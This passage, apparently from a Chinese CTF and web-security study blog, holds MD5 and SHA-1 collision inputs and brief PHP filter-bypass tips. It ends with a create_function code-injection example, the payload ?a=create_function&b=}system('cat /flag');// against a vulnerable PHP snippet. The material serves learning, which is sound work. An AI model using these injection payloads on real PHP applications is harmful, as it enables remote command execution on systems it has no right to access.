cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab"​$s2 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab"​$s3 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab"
+
+​
+
+## shal强碰撞
+
+> a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
+
+# * ?代替关键字
+
+# 遇到eval一定要注意分号;
+
+# %0a多行匹配绕过正则
+
+# json格式
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/b1827ff1-image.png)
+
+由键名键值组成
+
+# create_function绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">$a(&#x27;&#x27;,$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+形如$a(' ',$b)这类,即可使用create_function绕过,进行rce
+
+`?a=create_function&b=}system('cat /flag');//`
+
+}用于闭合create_function创建的匿名函数,;代表语句结束,//用于注释后面多余的}
+
+​
+
+---
+
+来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/kotyql98l79n0qx6
+语雀文档ID: 135092791
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/16/58-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="prev" title="文件包含漏洞">
+      <i class="fa fa-chevron-left"></i> 文件包含漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/16/01-java-CTFshow/" rel="next" title="java CTFshow">
+      java CTFshow <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="谷氨酸棒状杆菌"
+      src="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+  <p class="site-author-name" itemprop="name">谷氨酸棒状杆菌</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Glut4micum" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Glut4micum" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">谷氨酸棒状杆菌</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总访客量 fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总阅读量 fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
